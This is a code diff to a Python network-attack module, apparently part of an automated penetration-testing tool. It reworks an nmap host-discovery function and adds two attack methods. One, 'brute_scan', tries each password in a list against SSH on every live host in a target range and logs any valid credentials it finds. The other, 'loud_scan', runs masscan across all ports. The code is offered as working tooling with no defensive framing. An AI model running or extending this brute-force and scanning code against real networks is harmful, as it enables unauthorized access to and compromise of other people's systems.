@@ -9,37 +9,25 @@ import subprocess
 import platform
 import time
 import socket
-import nmap
+from nmap import PortScanner
 import os
-from target_config import SELF_IP_RE, TARGET_RANGE, IPV4_RE, TARGET_PASSWORD, TARGET_USERNAME
+from target_config import TARGET_IP, TARGET_INTERFACE, SELF_IP_RE, TARGET_RANGE, IPV4_RE
 class NetRunning:
     def __init__(self):
         self.cs = cs()
         self.fs = fs()
-    def scan_network(self, target_ip_range: str):
-        """Scan the network for active hosts within the specified IP range using nmap. This function performs a ping scan to identify active hosts in the given IP range. The results are logged using the ComputerSpeak class, and a list of active hosts is returned. The function also includes error handling to catch and report any issues that may arise during the scanning process."""
-        self.cs.execute_command(f"echo Scanning network for active hosts in range: {target_ip_range}")
-        nm = nmap.PortScanner()
-        nm.scan(hosts=target_ip_range, arguments=f'-sn -Pn -oN SurzsEnviro/SurzalsVulns/nmap_scan_{target_ip_range.replace("/", "_")}.txt')
-        active_hosts = [host for host in nm.all_hosts() if nm[host].state() == 'up']
-        self.cs.execute_command(f"echo Active hosts found: {', '.join(active_hosts)}")
-        return active_hosts
-    
-    def run_nmap_script(self, target_ip: str, script_name: str):
-        """Run a specific nmap script against the target IP and return the output. This function uses the nmap library to execute a specified nmap script against a target IP address. The results of the script execution are collected and returned in a structured format. The function also logs the actions being performed using the ComputerSpeak class, providing insights into the scanning process and the results obtained from the nmap script execution."""
-        self.cs.execute_command(f"echo 'Running nmap script {script_name} on target: {target_ip}'")
-        nm = nmap.PortScanner()
-        nm.scan(target_ip, arguments=f'--script={script_name} -oN SurzsEnviro/SurzalsVulns/nmap_{target_ip}_{script_name}.txt')
-        script_output = {}
-        for host in nm.all_hosts():
-            for proto in nm[host].all_protocols():
-                lport = nm[host][proto].keys()
-                for port in lport:
-                    if 'script' in nm[host][proto][port]:
-                        script_output[(port, proto)] = nm[host][proto][port]['script']
-        self.cs.speak(f"Nmap script output for {target_ip}: {script_output}")
-        return script_output
-    
+    def scan_network(self, target_ip_range: str, scripts: list = None):
+        """Scan the network for active hosts using nmap. Optionally, run specific nmap scripts against the detected hosts."""
+        self.cs.speak(f"Scanning network range {target_ip_range} for active hosts...")
+        nm = PortScanner()
+        try:
+            nm.scan(hosts=target_ip_range, arguments=f'-sn -oN {target_ip_range.replace("/", "_")}_nmap_results.txt')
+            active_hosts = [host for host in nm.all_hosts() if nm[host].state() == 'up']
+            self.cs.speak(f"Active hosts detected: {active_hosts}")
+            return active_hosts
+        except Exception as e:
+            self.cs.speak(f"An error occurred while scanning the network: {e}")
+            return []
 
 
     def create_server(self,folder:str, port: int):
@@ -52,6 +40,7 @@ class NetRunning:
         else:
             command = f"python3 -m http.server {port} --directory {folder}"
         subprocess.Popen(command, shell=True)
+
 
 
     def stop_server(self):
@@ -158,8 +147,6 @@ class NetRunning:
         csi=cs()
         ssh_client = paramiko.SSHClient()
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        if password is None:    
-            password = TARGET_PASSWORD
         try:
             ssh_client.connect(host, username=username, password=password, timeout=5)
             ssh_client.close()
@@ -176,18 +163,28 @@ class NetRunning:
         except Exception as e:
             csi.speak(f"An unexpected error occurred while connecting to {host} on SSH port: {e}")
             return False
-
-            
-
-
     @staticmethod
-    def _extract_hosts_from_nmap(nmap_output):
-        """Extract hosts from Nmap output using regular expressions."""
-        hosts = set()
-        for line in nmap_output.splitlines():
-            match = IPV4_RE.search(line)
-            if match:
-                ip = match.group()
-                if ip != SELF_IP_RE:
-                    hosts.add(ip)
-        return list(hosts)
+    def brute_scan(target_ip_range: str, username: str, password_list: list):
+        """Perform a brute-force scan for SSH credentials on the target IP range using the provided username and a list of passwords."""
+        csi = cs()
+        nri= NetRunning()
+        csi.speak(f"Starting brute-force scan for SSH credentials on {target_ip_range} with username {username}")
+        active_hosts = nri.scan_network(target_ip_range=target_ip_range, scripts=['auth'])
+        valid_credentials = []
+        for host in active_hosts:
+            for password in password_list:
+                if NetRunning.check_ssh_connection(host, username, password):
+                    csi.speak(f"Valid SSH credentials found for {host}: {username}:{password}")
+                    valid_credentials.append((host, username, password))
+                    break  # Stop trying passwords for this host after finding valid credentials
+                else:
+                    csi.speak(f"Invalid SSH credentials for {host}: {username}:{password}")
+        csi.speak(f"Brute-force scan complete. Valid credentials found: {valid_credentials}")
+        return valid_credentials
+    @staticmethod
+    def loud_scan(target_ip_range: str, rate=1000):
+        """Perform a loud scan of the target IP range using nmap with aggressive timing and verbose output."""
+        csi = cs()
+        csi.speak(f"Starting loud scan of {target_ip_range} with rate {rate} packets per second")
+        masscanr=csi.execute_command(f"masscan -p0-65535 --rate {rate} {target_ip_range} -oL loud_scan_results.txt")
+        return masscanr
